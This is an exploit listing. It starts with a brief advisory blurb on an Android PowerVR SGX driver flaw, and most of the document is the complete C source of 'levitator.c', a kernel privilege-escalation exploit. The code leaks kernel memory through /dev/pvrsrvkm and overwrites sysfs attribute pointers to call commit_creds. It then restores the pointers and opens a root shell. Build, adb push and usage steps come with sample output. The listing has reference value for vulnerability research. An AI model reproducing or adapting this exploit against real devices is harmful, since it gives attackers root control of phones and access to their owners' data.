// source: https://www.securityfocus.com/bid/57900/info

The PowerVR SGX driver in Android is prone to an information-disclosure vulnerability.

Successful exploits allows an attacker to gain access to sensitive information. Information obtained may aid in further attacks.

Android 2.3.5 and prior versions are vulnerable.


/*
 * levitator.c
 *
 * Android < 2.3.6 PowerVR SGX Privilege Escalation Exploit
 * Jon Larimer <jlarimer@gmail.com>
 * Jon Oberheide <jon@oberheide.org>
 *
 * Information:
 *
 *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1352
 *
 *   CVE-2011-1352 is a kernel memory corruption vulnerability that can lead
 *   to privilege escalation. Any user with access to /dev/pvrsrvkm can use
 *   this bug to obtain root privileges on an affected device.
 *
 *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1350
 *
 *   CVE-2011-1350 allows leaking a portion of kernel memory to user mode
 *   processes. This vulnerability exists because of improper bounds checking
 *   when returning data to user mode from an ioctl system call.
 *
 * Usage:
 *
 *   $ CC="/path/to/arm-linux-androideabi-gcc"
 *   $ NDK="/path/to/ndk/arch-arm"
 *   $ CFLAGS="-I$NDK/usr/include/"
 *   $ LDFLAGS="-Wl,-rpath-link=$NDK/usr/lib -L$NDK/usr/lib -nostdlib $NDK/usr/lib/crtbegin_dynamic.o -lc"
 *   $ $CC -o levitator levitator.c $CFLAGS $LDFLAGS
 *   $ adb push levitator /data/local/tmp/
 *   $ adb shell
 *   $ cd /data/local/tmp
 *   $ ./levitator
 *   [+] looking for symbols...
 *   [+] resolved symbol commit_creds to 0xc00770dc
 *   [+] resolved symbol prepare_kernel_cred to 0xc0076f64
 *   [+] resolved symbol dev_attr_ro to 0xc05a5834
 *   [+] opening prvsrvkm device...
 *   [+] dumping kernel memory...
 *   [+] searching kmem for dev_attr_ro pointers...
 *   [+] poisoned 16 dev_attr_ro pointers with fake_dev_attr_ro!
 *   [+] clobbering kmem with poisoned pointers...
 *   [+] triggering privesc via block ro sysfs attribute...
 *   [+] restoring original dev_attr_ro pointers...
 *   [+] restored 16 dev_attr_ro pointers!
 *   [+] privileges escalated, enjoy your shell!
 *   # id
 *   uid=0(root) gid=0(root)
 *
 *   Notes:
 *
 *     The vulnerability affects Android devices with the PowerVR SGX chipset
 *     which includes popular models like the Nexus S and Galaxy S series. The
 *     vulnerability was patched in the Android 2.3.6 OTA update.
 */

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/ioctl.h>

#define CONNECT_SERVICES 0xc01c670c
#define DUMP_SIZE        161920

typedef struct {
	uint32_t ui32BridgeID;
	uint32_t ui32Size;
	void *pvParamIn;
	uint32_t ui32InBufferSize;
	void *pvParamOut;
	uint32_t ui32OutBufferSize;
	void * hKernelServices;
} PVRSRV_BRIDGE_PACKAGE;

typedef int (* _commit_creds)(unsigned long cred);
typedef unsigned long (* _prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;

ssize_t
fake_disk_ro_show(void *dev, void *attr, char *buf)
{
	commit_creds(prepare_kernel_cred(0));
	return sprintf(buf, "0wned\n");
}

struct attribute {
	const char *name;
	void *owner;
	mode_t mode;
};

struct device_attribute {
	struct attribute attr;
	ssize_t (*show)(void *dev, void *attr, char *buf);
	ssize_t (*store)(void *dev, void *attr, const char *buf, size_t count);
};

struct device_attribute fake_dev_attr_ro = {
	.attr	= {
		.name = "ro",
		.mode = S_IRWXU | S_IRWXG | S_IRWXO,
	},
	.show = fake_disk_ro_show,
	.store = NULL,
};

unsigned long
get_symbol(char *name)
{
	FILE *f;
	unsigned long addr;
	char dummy, sname[512];
	int ret = 0;

	f = fopen("/proc/kallsyms", "r");
	if (!f) {
		return 0;
	}

	while (ret != EOF) {
		ret = fscanf(f, "%p %c %s\n", (void **) &addr, &dummy, sname);
		if (ret == 0) {
			fscanf(f, "%s\n", sname);
			continue;
		}
		if (!strcmp(name, sname)) {
			printf("[+] resolved symbol %s to %p\n", name, (void *) addr);
			return addr;
		}
	}

	return 0;
}

int
do_ioctl(int fd, void *in, unsigned int in_size, void *out, unsigned int out_size)
{
	PVRSRV_BRIDGE_PACKAGE pkg;

	memset(&pkg, 0, sizeof(pkg));

	pkg.ui32BridgeID = CONNECT_SERVICES;
	pkg.ui32Size = sizeof(pkg);
	pkg.ui32InBufferSize = in_size;
	pkg.pvParamIn = in;
	pkg.ui32OutBufferSize = out_size;
	pkg.pvParamOut = out;

	return ioctl(fd, 0, &pkg);
}

int
main(int argc, char **argv)
{
	DIR *dir;
	struct dirent *dentry;
	int fd, ret, found, trigger;
	char *dump, *dump_end, buf[8], path[256];
	unsigned long dev_attr_ro, *ptr;

	printf("[+] looking for symbols...\n");

	commit_creds = (_commit_creds) get_symbol("commit_creds");
	if (!commit_creds) {
		printf("[-] commit_creds symbol not found, aborting!\n");
		exit(1);
	}

	prepare_kernel_cred = (_prepare_kernel_cred) get_symbol("prepare_kernel_cred");
	if (!prepare_kernel_cred) {
		printf("[-] prepare_kernel_cred symbol not found, aborting!\n");
		exit(1);
	}

	dev_attr_ro = get_symbol("dev_attr_ro");
	if (!dev_attr_ro) {
		printf("[-] dev_attr_ro symbol not found, aborting!\n");
		exit(1);
	}

	printf("[+] opening prvsrvkm device...\n");

	fd = open("/dev/pvrsrvkm", O_RDWR);
	if (fd == -1) {
		printf("[-] failed opening pvrsrvkm device, aborting!\n");
		exit(1);
	}

	printf("[+] dumping kernel memory...\n");

	dump = malloc(DUMP_SIZE + 0x1000);
	dump_end = dump + DUMP_SIZE + 0x1000;
	memset(dump, 0, DUMP_SIZE + 0x1000);

	ret = do_ioctl(fd, NULL, 0, dump + 0x1000, DUMP_SIZE - 0x1000);
	if (ret == -1) {
		printf("[-] failed during ioctl, aborting!\n");
		exit(1);
	}

	printf("[+] searching kmem for dev_attr_ro pointers...\n");

	found = 0;
	for (ptr = (unsigned long *) dump; ptr < (unsigned long *) dump_end; ++ptr) {
		if (*ptr == dev_attr_ro) {
			*ptr = (unsigned long) &fake_dev_attr_ro;
			found++;
		}
	}

	printf("[+] poisoned %d dev_attr_ro pointers with fake_dev_attr_ro!\n", found);

	if (found == 0) {
		printf("[-] could not find any dev_attr_ro ptrs, aborting!\n");
		exit(1);
	}

	printf("[+] clobbering kmem with poisoned pointers...\n");

	ret = do_ioctl(fd, dump, DUMP_SIZE, NULL, 0);
	if (ret == -1) {
		printf("[-] failed during ioctl, aborting!\n");
		exit(1);
	}

	printf("[+] triggering privesc via block ro sysfs attribute...\n");

	dir = opendir("/sys/block");
	if (!dir) {
		printf("[-] failed opening /sys/block, aborting!\n");
		exit(1);
	}

	found = 0;
	while ((dentry = readdir(dir)) != NULL) {
		if (strcmp(dentry->d_name, ".") == 0 || strcmp(dentry->d_name, "..") == 0) {
			continue;
		}

		snprintf(path, sizeof(path), "/sys/block/%s/ro", dentry->d_name);

		trigger = open(path, O_RDONLY);
		if (trigger == -1) {
			printf("[-] failed opening ro sysfs attribute, aborting!\n");
			exit(1);
		}

		memset(buf, 0, sizeof(buf));
		ret = read(trigger, buf, sizeof(buf));
		close(trigger);

		if (strcmp(buf, "0wned\n") == 0) {
			found = 1;
			break;
		}
	}

	if (found == 0) {
		printf("[-] could not trigger privesc payload, aborting!\n");
		exit(1);
	}

	printf("[+] restoring original dev_attr_ro pointers...\n");

	ret = do_ioctl(fd, NULL, 0, dump + 0x1000, DUMP_SIZE - 0x1000);
	if (ret == -1) {
		printf("[-] failed during ioctl, aborting!\n");
		exit(1);
	}

	found = 0;
	for (ptr = (unsigned long *) dump; ptr < (unsigned long *) dump_end; ++ptr) {
		if (*ptr == (unsigned long) &fake_dev_attr_ro) {
			*ptr = (unsigned long) dev_attr_ro;
			found++;
		}
	}

	printf("[+] restored %d dev_attr_ro pointers!\n", found);

	if (found == 0) {
		printf("[-] could not restore any pointers, aborting!\n");
		exit(1);
	}

	ret = do_ioctl(fd, dump, DUMP_SIZE, NULL, 0);
	if (ret == -1) {
		printf("[-] failed during ioctl, aborting!\n");
		exit(1);
	}

	if (getuid() != 0) {
		printf("[-] privileges not escalated, exploit failed!\n");
		exit(1);
	}

	printf("[+] privileges escalated, enjoy your shell!\n");

	execl("/system/bin/sh", "sh", NULL);

	return 0;
}